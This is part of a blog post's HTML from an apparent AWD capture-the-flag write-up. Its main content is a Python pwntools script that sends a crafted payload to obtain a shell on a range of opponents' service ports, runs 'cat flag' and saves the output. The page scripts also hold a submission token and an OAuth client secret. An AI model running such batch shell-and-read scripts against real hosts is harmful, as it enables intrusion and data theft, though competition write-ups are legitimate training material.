+<h2 id="0x3-第二次awd-pwn1脚本"><a href="#0x3-第二次awd-pwn1脚本" class="headerlink" title="0x3 第二次awd pwn1脚本"></a>0x3 第二次awd pwn1脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">token = <span class="string">"7hQvn3AnHrtjaFmFN2MxztbCM4hGRQECZKEvJzu2dtSfU"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://10.66.20.15/api/v1/jad/web/submit_flag/?event_id=2"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ips=[]</span><br><span class="line"></span><br><span class="line">context.timeout = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">"How long is your secret?\n"</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">"So,tell me your secret:\n"</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">'Which secret do you want to drop off?'</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fo = open(<span class="string">"foo.txt"</span>, <span class="string">"w"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">28</span>):</span><br><span class="line"></span><br><span class="line">	ips.append(<span class="string">"1"</span> + str(i).rjust(<span class="number">2</span>,<span class="string">'0'</span>) + <span class="string">"80"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print ips</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(ip)</span>:</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">global</span> sh</span><br><span class="line"></span><br><span class="line">	sh = remote(<span class="string">'39.100.119.37'</span>, int(ip,<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#sh = process('./pwn')</span></span><br><span class="line"></span><br><span class="line">	sh.send(<span class="string">'iwanaflag'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">print</span> sh.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">'\x00'</span> * <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line">	sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">	sh.recvuntil(<span class="string">'4. exit'</span>)</span><br><span class="line"></span><br><span class="line">	sh.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">	sh.recvuntil(<span class="string">'Here is shell box!\n'</span>)</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">'ls\x00,/bin/sh'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	sh.send(payload)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#sh.interactive()</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(ip)</span>:</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">		sh = get_shell(ip)</span><br><span class="line"></span><br><span class="line">		<span class="comment">#sh.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		sh.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line"></span><br><span class="line">		<span class="comment">#sh.sendline('cat flag')</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">#sh.interactive()</span></span><br><span class="line"></span><br><span class="line">		flag = sh.recvall(timeout=<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">		fo.write(flag)</span><br><span class="line"></span><br><span class="line">		sh.close()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">		print(<span class="string">'KeyError'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">		print(<span class="string">'IndexError'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">		print(<span class="string">'TypeError'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">		print(<span class="string">'ValueError'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">		print(<span class="string">'Exception'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line"></span><br><span class="line">	<span class="comment"># if ip[7:9] == "16" or ip[7:9] == "17" or ip[7:8] == "8" or ip[7:8] == "6":</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 	continue</span></span><br><span class="line"></span><br><span class="line">	get_flag(ip)</span><br></pre></td></tr></table></figure>
+
+<p>python经常碰到一些缩进问题的报错，很烦人</p>
+
+      
+    </div>
+    
+    
+    
+
+      <div>
+        
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+        
+      </div>
+
+    
+
+    
+
+    
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/awd/" rel="tag"><i class="fa fa-tag"></i> awd</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/year/04/11/clew670x5002uff3fo9dd7psd/" rel="next" title="largebin_attack">
+                <i class="fa fa-chevron-left"></i> largebin_attack
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/year/05/12/clew670y4005xff3f9czskm8c/" rel="prev" title="网鼎杯writeup">
+                网鼎杯writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      
+        <div id="gitment-container"></div>
+      
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Wood">
+            
+              <p class="site-author-name" itemprop="name">Wood</p>
+              <p class="site-description motion-element" itemprop="description">stay hungry stay foolish.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">79</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Wood1314" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:wood@nuaa.edu.cn" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0-前言"><span class="nav-number">1.</span> <span class="nav-text">0x0 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-第一题"><span class="nav-number">2.</span> <span class="nav-text">0x1 第一题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-第二题"><span class="nav-number">3.</span> <span class="nav-text">0x2 第二题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#自动提交脚本"><span class="nav-number">4.</span> <span class="nav-text">自动提交脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#整理flag的正则"><span class="nav-number">4.1.</span> <span class="nav-text">整理flag的正则</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-第二次awd-pwn1脚本"><span class="nav-number">5.</span> <span class="nav-text">0x3 第二次awd pwn1脚本</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wood</span>
+  
+  
+</div>
+
+<div class="powered-by">
+  <i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+    本站访客数:<span id="busuanzi_value_site_uv"></span>
+  </span>
+</div>
+
+
+  <div class="powered-by"></div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitment({
+            id: window.location.pathname, 
+            owner: 'Wood1314',
+            repo: 'for_pinglun',
+            
+            oauth: {
+            
+            
+                client_secret: 'f720411d5aa74b5fbddfe66698e22296599316ec',
+            
+                client_id: '590d9ba949eb93622943'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      renderGitment();
+      
+      </script>
+    
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  + <script type="text/javascript" src="/js/src/instantclick.js" data-no-instant></script>
+  + <script data-no-instant>InstantClick.init();</script>
+</body>
+</html>
